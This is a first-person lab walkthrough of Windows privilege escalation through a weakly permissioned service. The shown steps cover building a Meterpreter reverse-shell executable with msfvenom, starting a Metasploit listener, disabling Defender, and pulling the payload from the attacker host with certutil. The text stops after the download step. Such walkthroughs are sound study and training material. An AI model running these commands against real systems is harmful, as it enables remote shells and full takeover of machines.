## Introduction

Insecure Service Configuration is a local privilege escalation technique. When a Windows service is set up with weak permissions, a low privilege user can modify how that service runs. If the service runs as SYSTEM, I can abuse those weak permissions to run my own code as SYSTEM and take full control of the machine — without any exploit or CVE.

## Why This Attack Works

Windows services often run as SYSTEM — the highest privilege account on the machine. If the service permissions are weak enough for a normal user to modify, I can change the binary path to point to my own malicious executable. When the service restarts, it runs my payload as SYSTEM.

## Attack Flow

```
Generated malicious payload (reverse.exe) on Kali with msfvenom
                              ↓
Started Metasploit listener on port 4444
                              ↓
Hosted payload over HTTP with Python HTTP server
                              ↓
Downloaded reverse.exe on victim machine via browser
                              ↓
Transferred payload to C:\PrivEsc using certutil
                              ↓
Ran reverse.exe on victim machine
                              ↓
Got Meterpreter shell on Kali as low privilege user (MSEDGEWIN10\user)
                              ↓
Uploaded winPEAS and ran it to find privilege escalation paths
                              ↓
winPEAS flagged daclsvc service as vulnerable
                              ↓
Verified with accesschk.exe — found SERVICE_CHANGE_CONFIG permission
                              ↓
Checked service config — daclsvc runs as LocalSystem (SYSTEM)
                              ↓
Generated second payload (privesc.exe) on port 9001
                              ↓
Uploaded privesc.exe to C:\PrivEsc on victim
                              ↓
Changed daclsvc binary path to C:\PrivEsc\privesc.exe
                              ↓
Started daclsvc service
                              ↓
Metasploit caught SYSTEM shell on port 9001
                              ↓
whoami → nt authority\system
```

## Step 1 — Generating a Malicious Payload with msfvenom

I used revshells.com to build the msfvenom command, then ran it on my Kali machine to generate a malicious executable.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.5.128 LPORT=4444 -f exe -o reverse.exe
```

### Flag Breakdown

- `-p windows/x64/meterpreter/reverse_tcp`: Generates a 64-bit Windows Meterpreter reverse TCP payload.
- `LHOST=192.168.5.128`: The IP address of my Kali machine that receives the reverse connection.
- `LPORT=4444`: The port on my Kali machine that listens for the incoming Meterpreter session.
- `-f exe`: Generates the payload as a Windows executable (.exe).
- `-o reverse.exe`: Saves the generated payload as reverse.exe.

**Output:**

```text
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: reverse.exe
```

## Step 2 — Setting Up Metasploit Listener and HTTP Server

I opened two terminals on Kali — one for the Metasploit listener and one to host the payload over HTTP.

Terminal 1 — Metasploit Listener

```bash
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.5.128
set lport 4444
run
```
**Output:**

```text
[*] Started reverse TCP handler on 192.168.5.128:4444
```

</p>

Terminal 2 — Python HTTP Server

```bash
python3 -m http.server 80
```

**Output:**

```text
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

</p>

## Step 3 — Downloading the Payload on the Victim Machine

I switched to the Windows 10 victim machine and opened Microsoft Edge. I browsed to my Kali HTTP server:

```bash
http://192.168.5.128/
```
I clicked reverse.exe to download it. Windows Defender blocked it at first — showing "Couldn't download - Virus detected". I turned off Real Time Protection and Threat Protection in Windows Defender settings, then the download went through successfully.

</p>

## Step 4 — Transferring the Payload to PrivEsc Folder

I opened CMD from C:\PrivEsc and used certutil to download reverse.exe from my Kali HTTP server:

```bash
certutil -urlcache -split -f http://192.168.5.128/reverse.exe reverse.exe
```
### Flag Breakdown

- `-urlcache` : Uses URL cache to download a file
- `-split` : Splits the download into blocks
- `-f` : Forces overwrite if file already exists

**Output:**

```text
CertUtil: -URLCache command completed successfully.
```
